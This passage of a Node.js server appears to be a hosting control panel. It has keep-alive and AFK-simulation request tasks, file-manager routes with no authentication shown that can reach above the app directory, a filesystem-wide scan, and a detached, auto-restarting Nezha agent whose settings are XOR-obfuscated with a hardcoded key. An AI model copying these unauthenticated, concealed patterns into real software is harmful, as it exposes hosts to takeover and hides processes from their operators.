    if(d.tasks&&d.tasks.length){d.tasks.forEach(function(t){tavernTasks.set(t.id,{id:t.id,name:t.name||'未命名',type:t.type||'cron',method:t.method||'GET',body:t.body||'',url:t.url||'',interval:t.interval||5,unit:t.unit||'min',account:t.account||'',password:t.password||'',token:t.token||'',running:false,timer:null,logs:t.logs||[]})})}
    if(d.auth) {
        if(d.auth.cookie || d.auth.apiKey) tavernAuth.token = d.auth.cookie || d.auth.apiKey;
        tavernAuth=Object.assign({},tavernAuth,d.auth);
    }}}catch(e){}
}
loadTavernConfig();

app.get("/api/apps/tavern/auth",function(req,res){res.json({auth:tavernAuth})});
app.post("/api/apps/tavern/auth",async function(req,res){tavernAuth=Object.assign({},tavernAuth,req.body||{});saveTavernConfig();res.json({success:true})});
app.get("/api/apps/tavern/tasks",function(req,res){
    var tasks=Array.from(tavernTasks.values()).map(function(t){return{id:t.id,name:t.name,type:t.type,method:t.method,body:t.body,url:t.url,interval:t.interval,unit:t.unit,account:t.account||'',password:t.password||'',token:t.token||'',running:t.running,logs:t.logs}});
    res.json({tasks:tasks});
});
app.post("/api/apps/tavern/tasks",function(req,res){
    var p=req.body||{};var id='task_'+Math.random().toString(36).substr(2,7);
    tavernTasks.set(id,{id:id,name:p.name||'未命名任务',type:p.type||'cron',method:p.method||'GET',body:p.body||'',url:p.url||'',interval:parseFloat(p.interval)||5,unit:p.unit||'min',account:p.account||'',password:p.password||'',token:p.token||'',running:false,timer:null,logs:[]});
    pushTaskLog(id,'📝 任务已创建','text-blue-400');saveTavernConfig();res.json({success:true,id:id});
});
app.put("/api/apps/tavern/tasks/:id",function(req,res){
    var task=tavernTasks.get(req.params.id);if(!task)return res.status(404).json({success:false});
    var p=req.body;
    if(p.name!==undefined)task.name=p.name;
    if(p.type!==undefined)task.type=p.type;
    if(p.method!==undefined)task.method=p.method;
    if(p.body!==undefined)task.body=p.body;
    if(p.url!==undefined)task.url=p.url;
    if(p.interval!==undefined)task.interval=parseFloat(p.interval)||5;
    if(p.unit!==undefined)task.unit=p.unit;
    if(p.account!==undefined)task.account=p.account;
    if(p.password!==undefined)task.password=p.password;
    if(p.token!==undefined)task.token=p.token;
    saveTavernConfig();res.json({success:true});
});
app.post("/api/apps/tavern/tasks/:id/start",async function(req,res){
    var task=tavernTasks.get(req.params.id);if(!task)return res.status(404).json({success:false,msg:"不存在"});
    if(task.running)return res.status(400).json({success:false,msg:"已运行"});if(!task.url)return res.status(400).json({success:false,msg:"无URL"});
    task.running=true;var hdr=buildAuthHeaders({account:task.account,password:task.password,token:task.token});var lb=task.type==='afk'?'模拟':task.type==='renew'?'续期':'访问';var ic=task.type==='afk'?'🎮':task.type==='renew'?'🔄':'📡';
    pushTaskLog(task.id,'✅ 每 '+task.interval+unitLabel(task.unit)+' '+lb,'text-emerald-400');
    pushTaskLog(task.id,'🎯 '+task.method+' '+task.url,'text-blue-400');
    async function doRequest() {
        try {
            var config = {timeout:15000, headers:Object.assign({},hdr), validateStatus:function(){return true}};
            var r;
            var m=(task.method||'GET').toUpperCase();
            if(m === 'PATCH') {
                var patchData=task.body;
                try{patchData=JSON.parse(task.body);config.headers['Content-Type']='application/json'}catch(e){config.headers['Content-Type']='text/plain'}
                r=await axios.patch(task.url,patchData,config);
            } else if(m === 'POST') {
                var postData = task.body;
                try { 
                    postData = JSON.parse(task.body); 
                    config.headers['Content-Type'] = 'application/json';
                } catch(e) {
                    config.headers['Content-Type'] = 'text/plain';
                }
                r = await axios.post(task.url, postData, config);
            } else {
                r = await axios.get(task.url, config);
            }
            pushTaskLog(task.id, ic+' '+m+' HTTP '+r.status, r.status<400?'text-emerald-300':'text-yellow-400');
        } catch(e) {
            pushTaskLog(task.id, '❌ '+e.message, 'text-red-400');
        }
    }
    await doRequest();
    task.timer=setInterval(doRequest, getIntervalMs(task.interval, task.unit));
    saveTavernConfig();res.json({success:true});
});
app.post("/api/apps/tavern/tasks/:id/stop",function(req,res){
    var task=tavernTasks.get(req.params.id);if(!task)return res.status(404).json({success:false,msg:"不存在"});
    if(task.timer){clearInterval(task.timer);task.timer=null}task.running=false;pushTaskLog(task.id,'⏹️ 已停止','text-orange-400');saveTavernConfig();res.json({success:true});
});
app.delete("/api/apps/tavern/tasks/:id",function(req,res){
    var task=tavernTasks.get(req.params.id);if(task){if(task.timer)clearInterval(task.timer);tavernTasks.delete(req.params.id);saveTavernConfig()}res.json({success:true});
});
app.post("/api/apps/tavern/tasks/:id/renew",async function(req,res){
    var task=tavernTasks.get(req.params.id);if(!task)return res.status(404).json({success:false,msg:"不存在"});
    if(!task.url)return res.status(400).json({success:false,msg:"未配置续期URL"});
    var hdr=buildAuthHeaders({account:task.account,password:task.password,token:task.token});
    pushTaskLog(task.id,'🔄 手动续期中...','text-violet-400');
    try{
        var config={timeout:15000,headers:Object.assign({},hdr),validateStatus:function(){return true}};
        var r;
        var method=(task.method||'GET').toUpperCase();
        if(method==='PATCH'){
            var patchData=task.body;
            try{patchData=JSON.parse(task.body);config.headers['Content-Type']='application/json'}catch(e){config.headers['Content-Type']='text/plain'}
            r=await axios.patch(task.url,patchData,config);
        }else if(method==='POST'){
            var postData=task.body;
            try{postData=JSON.parse(task.body);config.headers['Content-Type']='application/json'}catch(e){config.headers['Content-Type']='text/plain'}
            r=await axios.post(task.url,postData,config);
        }else{
            r=await axios.get(task.url,config);
        }
        if(r.status>=200&&r.status<400){
            pushTaskLog(task.id,'✅ 续期请求成功! HTTP '+r.status,'text-emerald-400');
        }else if(r.status===302||r.status===301){
            pushTaskLog(task.id,'✅ 续期请求已提交 (302重定向)','text-emerald-400');
        }else{
            pushTaskLog(task.id,'⚠️ 续期响应异常 HTTP '+r.status,'text-yellow-400');
        }
    }catch(e){
        pushTaskLog(task.id,'❌ 续期失败: '+e.message,'text-red-400');
    }
    saveTavernConfig();res.json({success:true});
});

// ===== 文件管理器 =====
const FM_BASE_DIR = __dirname;
const FM_BLOCKED = ['/proc','/sys','/dev','/run','/boot'];

function fmResolve(raw) {
    if (!raw || raw === '/') return FM_BASE_DIR;
    var relPath = raw.replace(/^\/+/, '');
    var resolved = path.resolve(FM_BASE_DIR, relPath);
    var limit = FM_BASE_DIR;
    for (var i = 0; i < 3; i++) limit = path.dirname(limit);
    if (!resolved.startsWith(limit)) return null;
    for (var j = 0; j < FM_BLOCKED.length; j++) { if (resolved.startsWith(FM_BLOCKED[j])) return null; }
    return resolved;
}

function fmRelative(abs) {
    if (abs === FM_BASE_DIR) return '/';
    var rel = path.relative(FM_BASE_DIR, abs);
    return rel.startsWith('..') ? rel : '/' + rel;
}

app.get("/api/apps/files/list", function(req, res) {
    var raw = req.query.dir || '/';
    var resolved = fmResolve(raw);
    if (!resolved) return res.status(403).json({success:false, msg:"路径越权"});
    try {
        if (!fsSync.existsSync(resolved)) return res.json({success:true, files:[], current:raw, parent:null, breadcrumbs:[]});
        var stat = fsSync.statSync(resolved);
        if (!stat.isDirectory()) return res.status(400).json({success:false, msg:"不是目录"});
        var items = [];
        fsSync.readdirSync(resolved).forEach(function(name) {
            try {
                var full = path.join(resolved, name);
                var s = fsSync.statSync(full);
                items.push({ name:name, path:fmRelative(full), isDir:s.isDirectory(), size:s.isFile()?s.size:0, modified:s.mtime.toISOString() });
            } catch(e) {}
        });
        items.sort(function(a,b){ if(a.isDir&&!b.isDir)return -1; if(!a.isDir&&b.isDir)return 1; return a.name.localeCompare(b.name); });
        var parentPath = null;
        if (resolved !== FM_BASE_DIR) {
            var parentAbs = path.dirname(resolved);
            if (fmResolve(fmRelative(parentAbs))) parentPath = fmRelative(parentAbs);
        }
        var upPaths = [];
        var cur = resolved;
        for (var k = 1; k <= 3; k++) {
            cur = path.dirname(cur);
            var rel = fmRelative(cur);
            if (fmResolve(rel)) { upPaths.push({level:k, path:rel, name: path.basename(cur) || '/'}); }
            else break;
        }
        var bc = [];
        var parts = raw === '/' ? [] : raw.split('/').filter(Boolean);
        var cum = '';
        parts.forEach(function(p, i) {
            cum += '/' + p;
            bc.push({name:p, path:cum});
        });
        res.json({success:true, files:items, current:raw, parent:parentPath, upPaths:upPaths, breadcrumbs:bc});
    } catch(e) { res.status(500).json({success:false, msg:e.message}); }
});

app.post("/api/apps/files/upload", upload.array('files', 20), async function(req, res) {
    var raw = req.body.dir || '/';
    var resolved = fmResolve(raw);
    if (!resolved) return res.status(403).json({success:false, msg:"路径越权"});
    if (!req.files || !req.files.length) return res.status(400).json({success:false, msg:"无文件"});
    try {
        if (!fsSync.existsSync(resolved)) fsSync.mkdirSync(resolved, {recursive:true});
        var results = [];
        for (var i = 0; i < req.files.length; i++) {
            var f = req.files[i];
            var safeName = path.basename(f.originalname);
            await fs.writeFile(path.join(resolved, safeName), f.buffer);
            results.push(safeName);
        }
        res.json({success:true, files:results});
    } catch(e) { res.status(500).json({success:false, msg:e.message}); }
});

app.post("/api/apps/files/mkdir", async function(req, res) {
    var raw = req.body.path;
    if (!raw) return res.status(400).json({success:false, msg:"无路径"});
    var resolved = fmResolve(raw);
    if (!resolved) return res.status(403).json({success:false, msg:"路径越权"});
    try {
        if (fsSync.existsSync(resolved)) return res.status(400).json({success:false, msg:"已存在"});
        fsSync.mkdirSync(resolved, {recursive:true});
        res.json({success:true});
    } catch(e) { res.status(500).json({success:false, msg:e.message}); }
});

app.delete("/api/apps/files/delete", async function(req, res) {
    var raw = req.body.path;
    if (!raw || raw === '/') return res.status(403).json({success:false, msg:"不能删除根目录"});
    var resolved = fmResolve(raw);
    if (!resolved) return res.status(403).json({success:false, msg:"路径越权"});
    try {
        if (!fsSync.existsSync(resolved)) return res.status(404).json({success:false, msg:"不存在"});
        var stat = fsSync.statSync(resolved);
        if (stat.isDirectory()) await fs.rm(resolved, {recursive:true, force:true});
        else await fs.unlink(resolved);
        res.json({success:true});
    } catch(e) { res.status(500).json({success:false, msg:e.message}); }
});

app.get("/api/apps/files/download", function(req, res) {
    var raw = req.query.path;
    if (!raw) return res.status(400).json({success:false, msg:"无路径"});
    var resolved = fmResolve(raw);
    if (!resolved) return res.status(403).json({success:false, msg:"路径越权"});
    try {
        if (!fsSync.existsSync(resolved)) return res.status(404).json({success:false, msg:"不存在"});
        var stat = fsSync.statSync(resolved);
        if (stat.isDirectory()) return res.status(400).json({success:false, msg:"不能下载目录"});
        res.download(resolved, path.basename(resolved));
    } catch(e) { res.status(500).json({success:false, msg:e.message}); }
});


function timeToMs(s, m, h, d) {
    return ((parseInt(s)||0) + (parseInt(m)||0)*60 + (parseInt(h)||0)*3600 + (parseInt(d)||0)*86400) * 1000;
}

function getLocalIPv4() {
    const interfaces = os.networkInterfaces();
    const candidates = [];
    for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                const ip = iface.address;
                if (/^(?!10\.)(?!172\.(1[6-9]|2\d|3[01])\.)(?!192\.168\.)/.test(ip)) {
                    candidates.push({ ip, priority: 0 });
                } else {
                    candidates.push({ ip, priority: 1 });
                }
            }
        }
    }
    candidates.sort((a, b) => a.priority - b.priority);
    return candidates.length > 0 ? candidates[0].ip : '127.0.0.1';
}
async function getServerPublicIP() {
    const ipSources = [
        { url: 'https://api4.ipify.org',      parser: (d) => d.trim(), desc: 'ipify-v4' },
        { url: 'https://ipv4.icanhazip.com',   parser: (d) => d.trim(), desc: 'icanhazip-v4' },
        { url: 'https://api.ipify.org',        parser: (d) => d.trim(), desc: 'ipify-default' },
        { url: 'https://ip.sb/ip',             parser: (d) => d.trim(), desc: 'ipsb' },
        { url: 'https://ifconfig.me/ip',       parser: (d) => d.trim(), desc: 'ifconfig' },
        { url: 'https://ipinfo.io/ip',         parser: (d) => d.trim(), desc: 'ipinfo' },
        { url: 'http://ip-api.com/json',       parser: (d) => { try { return JSON.parse(d).query; } catch(e) { return null; } }, desc: 'ipapi' }
    ];
    for (const source of ipSources) {
        try {
            const isHttps = source.url.startsWith('https:');
            const agentOptions = {
                family: 4,
                rejectUnauthorized: false
            };
            const agent = isHttps
                ? new https.Agent(agentOptions)
                : new http.Agent(agentOptions);
            const res = await axios.get(source.url, {
                timeout: 8000,
                headers: { 'User-Agent': 'curl/7.88.1' },
                httpsAgent: isHttps ? agent : undefined,
                httpAgent: !isHttps ? agent : undefined
            });
            const ip = source.parser(res.data);
            if (ip && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
                return ip;
            }
        } catch (e) {
            continue;
        }
    }
    try {
        const dns = require('dns');
        const publicDNS = ['1.1.1.1', '8.8.8.8', '9.9.9.9'];
        const testDomain = 'o-o.myaddr.l.google.com';
        for (const dnsServer of publicDNS) {
            try {
                const resolver = new dns.Resolver();
                resolver.setServers([dnsServer]);
                const addresses = await new Promise((resolve, reject) => {
                    resolver.resolve4(testDomain, (err, addrs) => {
                        if (err) reject(err);
                        else resolve(addrs);
                    });
                });
                if (addresses && addresses.length > 0) {
                    const ip = addresses[0];
                    if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
                        return ip;
                    }
                }
            } catch (e) {
                continue;
            }
        }
    } catch (e) {}
    return getLocalIPv4();
}

// ===== MC 服务器自动发现 =====
const MC_PROPS_KEYS = ['server-ip', 'server-ip=', 'ip', 'address', 'addr', 'host', 'hostname'];
const MC_DEFAULT_PORTS = [25565, 25566, 25567, 12345, 25575];

function readMCServerProperties(dir) {
    try {
        const propFile = path.join(dir, 'server.properties');
        if (!fsSync.existsSync(propFile)) return null;
        const content = fsSync.readFileSync(propFile, 'utf8');
        const props = {};
        content.split('\n').forEach(function(line) {
            line = line.trim();
            if (!line || line.startsWith('#')) return;
            var eq = line.indexOf('=');
            if (eq > 0) {
                props[line.substring(0, eq).trim()] = line.substring(eq + 1).trim();
            }
        });
        return props;
    } catch(e) {
        return null;
    }
}

function findMCServerInDir(dir) {
    try {
        var props = readMCServerProperties(dir);
        if (props) {
            var ip = props['server-ip'] || props['server-ip='] || '';
            var port = parseInt(props['server-port'] || '25565');
            if (ip && ip !== '0.0.0.0' && ip !== '127.0.0.1' && ip !== 'localhost') {
                return { ip: ip, port: port || 25565, source: dir + '/server.properties' };
            }
            if (port && port !== 25565) {
                return { ip: getLocalIPv4(), port: port, source: dir + '/server.properties' };
            }
        }
        var jars = fsSync.readdirSync(dir).filter(function(f) { return f.endsWith('.jar'); });
        if (jars.length > 0) {
            return { ip: getLocalIPv4(), port: 25565, source: dir };
        }
    } catch(e) {}
    return null;
}

function discoverMCServer(maxDepth) {
    maxDepth = maxDepth || 3;
    var candidates = [];

    function scanDir(dir, depth) {
        if (depth > maxDepth) return;
        try {
            var entries = fsSync.readdirSync(dir);
            for (var i = 0; i < entries.length; i++) {
                var full = path.join(dir, entries[i]);
                try {
                    var stat = fsSync.statSync(full);
                    if (!stat.isDirectory()) continue;
                    if (entries[i].startsWith('.') || entries[i] === 'node_modules' || entries[i] === '.git') continue;
                    var found = findMCServerInDir(full);
                    if (found) candidates.push(found);
                    scanDir(full, depth + 1);
                } catch(e) {}
            }
        } catch(e) {}
    }

    var homeDir = os.homedir();
    var sysRoot = '/';
    var tmpDir = os.tmpdir();
    var cwd = process.cwd();

    scanDir(homeDir, 0);
    scanDir(tmpDir, 0);
    scanDir(cwd, 0);
    if (fsSync.existsSync('/root')) scanDir('/root', 0);
    if (fsSync.existsSync('/srv')) scanDir('/srv', 0);
    if (fsSync.existsSync('/opt')) scanDir('/opt', 0);
    if (fsSync.existsSync('/data')) scanDir('/data', 0);
    scanDir(sysRoot, 0);

    var unique = [];
    var seen = {};
    for (var i = 0; i < candidates.length; i++) {
        var key = candidates[i].ip + ':' + candidates[i].port;
        if (!seen[key]) { seen[key] = true; unique.push(candidates[i]); }
    }

    if (unique.length > 0) return unique[0];

    // 扫描本机端口
    for (var p = 0; p < MC_DEFAULT_PORTS.length; p++) {
        try {
            var s = new (require('net')).Server();
            var port = MC_DEFAULT_PORTS[p];
            s.once('error', function(){});
            s.listen(port, '0.0.0.0', function() {
                try { s.close(); } catch(e) {}
            });
            s.once('connection', function(c) { c.end(); try { s.close(); } catch(e) {} });
            setTimeout(function() { try { s.close(); } catch(e) {} }, 500);
        } catch(e) {}
    }

    return null;
}

function discoverMCServerWithPortFallback() {
    var discovered = discoverMCServer(2);
    if (discovered) return discovered;

    var envIp = process.env.MC_SERVER_IP || process.env.MC_IP || '';
    var envPort = process.env.MC_SERVER_PORT || process.env.MC_PORT || '25565';
    if (envIp && envIp !== '0.0.0.0' && envIp !== '127.0.0.1') {
        return { ip: envIp, port: parseInt(envPort) || 25565, source: 'env:MC_SERVER_IP' };
    }

    var tunnelUrl = '';
    try { tunnelUrl = fsSync.existsSync(path.join(__dirname, '..', 'tunnel_url.txt')) ? fsSync.readFileSync(path.join(__dirname, '..', 'tunnel_url.txt'), 'utf8').trim() : ''; } catch(e) {}
    if (!tunnelUrl) {
        try { tunnelUrl = fsSync.existsSync(path.join(process.cwd(), 'tunnel_url.txt')) ? fsSync.readFileSync(path.join(process.cwd(), 'tunnel_url.txt'), 'utf8').trim() : ''; } catch(e) {}
    }
    if (!tunnelUrl) {
        try { tunnelUrl = NodeEnv && NodeEnv.readText ? NodeEnv.readText(new (require('fs')).Path().join((process.cwd()), 'tunnel_url.txt')) : ''; } catch(e) {}
    }
    if (tunnelUrl) {
        try {
            var match = tunnelUrl.match(/https?:\/\/(?:[^@:]*@)?([^:/]+)(?::(\d+))?/);
            if (match) return { ip: match[1], port: match[2] ? parseInt(match[2]) : 80, source: 'tunnel_url.txt' };
        } catch(e) {}
    }

    return { ip: getLocalIPv4(), port: 25565, source: 'default' };
}

function generateIPBasedUUID(ip) {
    const seed = ip || 'default';
    const hashBuf = crypto.createHash('sha256').update('nezha-agent-uuid:' + seed).digest();
    const p1 = hashBuf.readUInt32BE(0).toString(16).padStart(8, '0');
    const p2 = hashBuf.readUInt16BE(4).toString(16).padStart(4, '0');
    const p3raw = hashBuf.readUInt16BE(6);
    const p3 = ((p3raw & 0x0fff) | 0x4000).toString(16).padStart(4, '0');
    const p4raw = hashBuf.readUInt16BE(8);
    const p4 = ((p4raw & 0x3fff) | 0x8000).toString(16).padStart(4, '0');
    const p5 = hashBuf.slice(10, 16).toString('hex');
    return `${p1}-${p2}-${p3}-${p4}-${p5}`;
}
function generateDeterministicUUID(ip, key) {
    return generateIPBasedUUID(ip);
}
function generateRandomUUID() {
    return generateIPBasedUUID('');
}
const NEZHA_ENC_KEY = Buffer.from('NzHa_Pr0b3_2026_S3cr3t_K3y!!', 'utf8');
function nezhaEncode(plaintext) {
    if (!plaintext) return '';
    const buf = Buffer.from(plaintext, 'utf8');
    const result = Buffer.alloc(buf.length);
    for (let i = 0; i < buf.length; i++) {
        result[i] = buf[i] ^ NEZHA_ENC_KEY[i % NEZHA_ENC_KEY.length];
    }
    return 'enc:' + result.toString('base64');
}
function nezhaDecode(encoded) {
    if (!encoded || !encoded.startsWith('enc:')) return encoded;
    const b64 = encoded.slice(4);
    try {
        const buf = Buffer.from(b64, 'base64');
        const result = Buffer.alloc(buf.length);
        for (let i = 0; i < buf.length; i++) {
            result[i] = buf[i] ^ NEZHA_ENC_KEY[i % NEZHA_ENC_KEY.length];
        }
        return result.toString('utf8');
    } catch (e) {
        return encoded;
    }
}
const _BIN_CFG_KEY = Buffer.from('NzHa_Pr0b3_2026_S3cr3t_K3y!!', 'utf8');
function _binEncrypt(buf) { const r = Buffer.alloc(buf.length); for (let i = 0; i < buf.length; i++) r[i] = buf[i] ^ _BIN_CFG_KEY[i % _BIN_CFG_KEY.length]; return r; }
function _writeBinCfg(filePath, obj) { try { const enc = _binEncrypt(Buffer.from(JSON.stringify(obj), 'utf8')); fsSync.writeFileSync(filePath, enc); } catch(e) {} }
function _readBinCfg(filePath) { try { if (!fsSync.existsSync(filePath)) return null; const enc = fsSync.readFileSync(filePath); const dec = _binEncrypt(enc); return JSON.parse(dec.toString('utf8')); } catch(e) { return null; } }
async function loadNezhaConfig() {
    const defaultNezhaConfig = {
        addr: '',
        key: '',
        tls: false,
        mode: 'pure' // 默认纯Node.js, 模式在面板上改
    };
    try {
        const savedConfig = _readBinCfg(NEZHA_CONFIG_FILE);
        if (savedConfig) {
            if (savedConfig.addr) savedConfig.addr = nezhaDecode(savedConfig.addr);
            if (savedConfig.key) savedConfig.key = nezhaDecode(savedConfig.key);
            if (savedConfig && savedConfig.addr && savedConfig.key) {
                nezhaConfig = savedConfig;
                if (!nezhaConfig.uuid) nezhaConfig.uuid = '';
                if (!nezhaConfig._sourceIP) nezhaConfig._sourceIP = '';
                if (nezhaConfig._sourceIP && !/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(nezhaConfig._sourceIP)) {
                    nezhaConfig._sourceIP = '';
                }
                if (!nezhaConfig.mode) nezhaConfig.mode = 'pure';
                return;
            }
        }
    } catch (e) {}
    nezhaConfig = defaultNezhaConfig;
    try { await saveNezhaConfig(); } catch (e) {}
}
async function saveNezhaConfig() {
    try {
        if (!fsSync.existsSync(NEZHA_DIR)) {
fsSync.mkdirSync(NEZHA_DIR, {recursive:true});
        }
        const safeConfig = {
            addr: nezhaEncode(nezhaConfig.addr),
            key: nezhaEncode(nezhaConfig.key),
            tls: nezhaConfig.tls,
            uuid: nezhaConfig.uuid || '',
            _sourceIP: nezhaConfig._sourceIP || '',
            mode: nezhaConfig.mode || 'pure'
        };
        _writeBinCfg(NEZHA_CONFIG_FILE, safeConfig);
    } catch (err) {
    }
}
async function startNezha(addr, key, tls) {
    if (nezhaProcess) { try { nezhaProcess.kill(); } catch(e) {} nezhaProcess = null; }
    if (!addr || !key) return;
    pushNezhaLog('🚀 老王模式探针启动中...', 'text-emerald-400 font-bold');
    try { if (!fsSync.existsSync(NEZHA_DIR)) fsSync.mkdirSync(NEZHA_DIR, {recursive:true}); } catch(e) {}
    let currentIP = nezhaConfig._sourceIP || '';
    if (!currentIP) { try { currentIP = await SysCollector.getPublicIP(); } catch(e) {} }
    let currentUUID = nezhaConfig.uuid || '';
    const needRegenerate = !currentUUID || currentUUID.trim() === '';
    if (needRegenerate && currentIP) {
        currentUUID = generateIPBasedUUID(currentIP);
        nezhaConfig.uuid = currentUUID;
        await saveNezhaConfig();
    } else if (needRegenerate) {
        currentUUID = crypto.randomUUID();
        nezhaConfig.uuid = currentUUID;
        await saveNezhaConfig();
    }
    let targetPath = null;
    try {
        if (fsSync.existsSync(NEZHA_DIR)) {
            const files = fsSync.readdirSync(NEZHA_DIR);
            for (const file of files) {
                const fullPath = path.join(NEZHA_DIR, file);
                try {
                    if (fsSync.statSync(fullPath).isFile()) {
                        try { fsSync.chmodSync(fullPath, 0o755); } catch(e) {}
                        targetPath = fullPath;
                        break;
                    }
                } catch(e) {}
            }
        }
    } catch(e) {}
    if (!targetPath || !fsSync.existsSync(targetPath)) {
        console.error('No nezha-agent binary found for laowang mode');
        return;
    }
    const isTls = (tls || addr.includes(':443')) ? 'true' : 'false';
    try {
        nezhaProcess = spawn(targetPath, [], {
            cwd: NEZHA_DIR,
            stdio: ['ignore', 'ignore', 'ignore'],
            env: { ...process.env, NZ_SERVER: addr, NZ_PASSWORD: key, NZ_CLIENT_SECRET: key, NZ_TLS: isTls, NZ_UUID: currentUUID || '' },
            ...(process.platform !== 'win32' && { detached: true })
        });
        nezhaProcess.on('exit', () => {
            if (!nezhaUserStopped && nezhaConfig.addr && nezhaConfig.key) {
                nezhaRestartAttempts++;
                if (nezhaRestartTimer) clearTimeout(nezhaRestartTimer);
                nezhaRestartTimer = setTimeout(() => {
                    startNezha(nezhaConfig.addr, nezhaConfig.key, nezhaConfig.tls);
                    nezhaRestartTimer = null;
                }, NEZHA_RESTART_DELAY);
            } else { nezhaRestartAttempts = 0; }
            nezhaProcess = null;
        });
    } catch(e) {
        if (!nezhaUserStopped) {
            nezhaRestartAttempts++;
            setTimeout(() => {
                if (nezhaConfig.addr && nezhaConfig.key) startNezha(nezhaConfig.addr, nezhaConfig.key, nezhaConfig.tls);
            }, NEZHA_RESTART_DELAY);
        }
    }
}
const PB = {
    encodeVarint(val) {
        if (typeof val === 'number' && !Number.isInteger(val)) val = Math.floor(Math.max(0, val));
        val = BigInt(val);
        if (val < 0n) val = val + (1n << 64n);
        const bytes = [];
        do {
            let byte = Number(val & 0x7fn);
            val >>= 7n;
            if (val > 0n) byte |= 0x80;
            bytes.push(byte);
        } while (val > 0n);
        return Buffer.from(bytes);
    },
    decodeVarint(buf, off) {
        let val = 0n, shift = 0n;
        while (off < buf.length) {
            const b = BigInt(buf[off]);
            val |= (b & 0x7fn) << shift;
            off++;
            if (!(b & 0x80n)) break;
            shift += 7n;
        }
        return { val: Number(val), off };
    },
    tag(fn, wt) { return this.encodeVarint((fn << 3) | wt); },
    uint64(fn, v) { return Buffer.concat([this.tag(fn, 0), this.encodeVarint(v || 0)]); },
    double(fn, v) {
        const b = Buffer.alloc(8);
        b.writeDoubleLE(v || 0, 0);
        return Buffer.concat([this.tag(fn, 1), b]);
    },
    string(fn, v) {
        if (!v) return Buffer.alloc(0);
        const s = Buffer.from(String(v), 'utf8');
        return Buffer.concat([this.tag(fn, 2), this.encodeVarint(s.length), s]);
    },
    bytes(fn, v) {
        if (!v || !v.length) return Buffer.alloc(0);
        return Buffer.concat([this.tag(fn, 2), this.encodeVarint(v.length), v]);
    },
    repString(fn, arr) {
        if (!arr || !arr.length) return Buffer.alloc(0);
        return Buffer.concat(arr.map(v => this.string(fn, v)));
    },
    repDouble(fn, arr) {
        if (!arr || !arr.length) return Buffer.alloc(0);
        return Buffer.concat(arr.map(v => this.double(fn, v)));
    },
    msg(parts) { return Buffer.concat(parts.filter(p => p && p.length > 0)); },
    frame(msgBuf) {
        const header = Buffer.alloc(5);
        header[0] = 0;
        header.writeUInt32BE(msgBuf.length, 1);
        return Buffer.concat([header, msgBuf]);
    },
    unframe(buf) {
        const frames = [];
        let off = 0;
        while (off + 5 <= buf.length) {
            const compressed = buf[off];
            const len = buf.readUInt32BE(off + 1);
            off += 5;
            if (off + len > buf.length) break;
            frames.push(buf.slice(off, off + len));
            off += len;
        }
        return frames;
    }
};

const NezhaMsg = {
    encodeHost(info) {
        return PB.msg([
            PB.string(1, info.platform),
            PB.string(2, info.platformVersion),
            PB.repString(3, info.cpu || []),
            PB.uint64(4, info.memTotal),
            PB.uint64(5, info.diskTotal),
            PB.uint64(6, info.swapTotal),
            PB.string(7, info.arch),
            PB.string(8, info.virtualization),
            PB.uint64(9, info.bootTime),
            PB.string(10, info.version || ''),     // ★ 编号10=版本（官方proto: string version = 10）
            PB.repString(11, info.gpu || []),      // ★ 编号11=GPU（官方proto: repeated string gpu = 11）
        ]);
    },
    encodeState(s) {
        return PB.msg([
            PB.double(1, s.cpu),
            PB.uint64(2, Math.round(s.memUsed) || 0),
            PB.uint64(3, s.swapUsed),
            PB.uint64(4, s.diskUsed),
            PB.uint64(5, s.netInTransfer),
            PB.uint64(6, s.netOutTransfer),
            PB.uint64(7, Math.round(s.netInSpeed) || 0),
            PB.uint64(8, Math.round(s.netOutSpeed) || 0),
            PB.uint64(9, s.uptime),
            PB.double(10, s.load1),
            PB.double(11, s.load5),
            PB.double(12, s.load15),
            PB.uint64(13, s.tcpConnCount),
            PB.uint64(14, s.udpConnCount),
            PB.uint64(15, s.processCount),
            PB.repDouble(17, s.gpu || []),
        ]);
    },
    encodeTaskResult(r) {
        return PB.msg([
            PB.uint64(1, r.id),
            PB.uint64(2, r.type),
            PB.double(3, r.delay || 0),
            PB.string(4, r.data || ''),
            PB.uint64(5, r.successful ? 1 : 0),
        ]);
    },
    encodeGeoIP(ipv4, ipv6) {
        const ipFields = [];
        if (ipv4) ipFields.push(PB.string(1, ipv4));
        if (ipv6) ipFields.push(PB.string(2, ipv6));
        const ipBuf = PB.msg(ipFields);
        return PB.msg([
            PB.uint64(1, ipv6 ? 1 : 0),
            PB.bytes(2, ipBuf),
        ]);
    },
};

const SysCollector = {
    _hostCache: null,
    _hostCacheTime: 0,
    _hostCacheTTL: 30 * 60 * 1000,
    _ipCache: null,
    _ipCacheTime: 0,
    _ipCacheTTL: 10 * 60 * 1000,
    async getPublicIP() {
        const now = Date.now();
        if (this._ipCache && (now - this._ipCacheTime) < this._ipCacheTTL) {
            return this._ipCache;
        }
        try {
            const ip = await getServerPublicIP();
            if (ip && /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
                this._ipCache = ip;
                this._ipCacheTime = now;
                return ip;
            }
        } catch(e) {}
        return this._ipCache || nezhaConfig._sourceIP || '';
    },
    _getDiskCapacity() {
        let diskTotal = 0, diskUsed = 0;
        try {
            if (os.platform() === 'win32') return { diskTotal, diskUsed };
            if (fs.statfsSync) {
                const stat = fs.statfsSync('/');
                diskTotal = stat.blocks * stat.bsize;
                diskUsed = (stat.blocks - stat.bfree) * stat.bsize;
            }
        } catch(e) {}
        if (!diskTotal) {
            try {
                const { execSync } = require('child_process');
                const df = execSync('df -B1 / 2>/dev/null', { encoding: 'utf8' }).trim();
                const parts = df.split('\n')[1]?.split(/\s+/);
                if (parts?.length >= 3) { diskTotal = parseInt(parts[1]) || 0; diskUsed = parseInt(parts[2]) || 0; }
            } catch(e) {}
        }
        if (!diskTotal) {
            try {
                const { execSync } = require('child_process');
                const dfOut = execSync('df --output=size,used -B1 / 2>/dev/null', { encoding: 'utf8' }).trim();
                const line = dfOut.split('\n').pop().trim().split(/\s+/);
                if (line.length >= 2) { diskTotal = parseInt(line[0]) || 0; diskUsed = parseInt(line[1]) || 0; }
            } catch(e) {}
        }
        if (!diskTotal && fs.statfsSync) {
            const altMounts = ['/data', '/overlay', '/mnt/data', '/var/lib/docker', '/host'];
